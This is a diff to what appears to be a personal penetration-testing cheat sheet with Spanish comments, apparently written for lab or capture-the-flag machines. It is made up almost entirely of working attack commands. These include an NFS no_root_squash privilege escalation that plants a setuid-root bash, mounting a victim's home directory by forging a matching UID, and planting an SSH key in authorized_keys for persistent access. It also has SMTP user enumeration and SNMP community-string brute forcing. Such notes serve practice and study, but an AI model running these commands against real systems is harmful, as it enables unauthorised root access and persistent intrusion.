@@ -1,16 +1,26 @@
-# nfs no_root_squash exploit
-# atacante
+# nfs
+## atacante
 sudo mount -t nfs IP:share /tmp/mount/ -nolock
 cp /bin/bash /mnt/bash
 sudo chown root:root bash
 sudo chmod 4777 bash
-# victima
+## victima
 ./bash -p
 
-#telnet CE
-A> tcpdump -n -i any port 53
-A> tcpdump -i tun0 icmp
-C> .RUN ping -c1 IP
+# creacion de usuario "william" con mismo UID de la maquina para poder montar NFS
+sudo adduser --no-create-home --uid 3003 --shell /bin/bash william
+sudo usermod -aG sudo william
+
+sudo mount -t nfs 10.10.243.200:/home/william /mnt/william
+
+william> ssh-keygen -t rsa
+william> cat id_rsa.pub > authorized_keys
+william> cp authorized_keys .ssh/ --> en maquina victima
+ssh -i id_rsa william@10.10.33.120
 
 # smtp user enum
 smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t 10.10.67.168
+
+# snmp
+snmpwalk -v 2c -c public 10.129.42.253
+onesixtyone -c dict.txt 10.129.42.254 # brute-force community
